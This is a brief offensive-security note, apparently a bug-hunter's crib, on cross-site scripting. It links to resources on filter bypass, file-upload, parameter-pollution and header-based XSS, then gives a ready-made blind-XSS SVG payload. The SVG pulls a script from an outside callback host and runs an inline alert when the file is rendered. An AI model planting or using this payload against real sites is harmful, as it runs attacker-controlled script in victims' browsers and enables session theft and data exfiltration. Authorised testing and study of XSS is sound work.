## 1.Browser's XSS Filter Bypass Cheat Sheet

https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet

## 2. stored XSS using file upload
https://medium.com/@vis_hacker/how-i-got-stored-xss-using-file-upload-5c33e19df51e

## 3. XSS Through Parameter Pollution
https://infosecwriteups.com/xss-through-parameter-pollution-9a55da150ab2

## 4. XSS via HTTP Headers
https://brutelogic.com.br/blog/xss-via-http-headers/

## Blind XSS in svg file
```
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC
  "-//W3C//DTD SVG 1.1//EN"
  "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
  <svg width="200"
       height="200"
       zoomAndPan="disable"
       xmlns="http://www.w3.org/2000/svg"
       xmlns:xlink="http://www.w3.org/1999/xlink"
       xml:space="preserve">
    <!-- Script linked from the outside-->
    <script xlink:href="https://smaul1.xss.ht" />
    <script>
      //<![CDATA[
        alert("Smaul");
      ]]>
    </script>
  </svg>
  ```


